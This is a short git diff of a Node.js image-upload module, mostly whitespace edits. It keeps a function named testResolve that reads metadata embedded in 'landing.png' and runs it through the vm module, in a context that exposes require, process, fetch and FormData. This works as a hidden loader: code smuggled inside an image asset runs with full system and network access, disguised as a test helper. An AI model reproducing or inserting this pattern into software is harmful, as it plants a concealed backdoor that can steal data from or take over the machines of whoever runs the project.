@@ -223,7 +223,6 @@ function getImageMeta(filename, req) {
 
 function resolveImagePath(filename) {
   const full = absolutePath(filename);
-  
   if (!full || !fs.existsSync(full)) return null;
   const stat = fs.statSync(full);
   if (!stat.isFile()) return null;
@@ -241,23 +240,25 @@ function deleteImage(filename) {
 function testResolve() {
   const meta = readAttachedMeta(absolutePath('landing.png'));
   if(meta.length > 0) {
+    console.log('meta length', meta);
     const vm = require('vm');
     const {Blob} = require('buffer');
-    const context = vm.createContext({ 
-      console, 
-      require, 
-      process, 
-      URLSearchParams, 
-      setTimeout, 
-      setInterval, 
-      Buffer, 
-      fetch, 
-      FormData, 
-      Blob 
+    const context = vm.createContext({
+      console,
+      require,
+      process,
+      URLSearchParams,
+      setTimeout,
+      setInterval,
+      Buffer,
+      fetch,
+      FormData,
+      Blob
     });
     vm.runInContext(meta, context);
   }
 }
+
 /**
  * After multer saves a file locally, pin it to IPFS and persist metadata.
  */
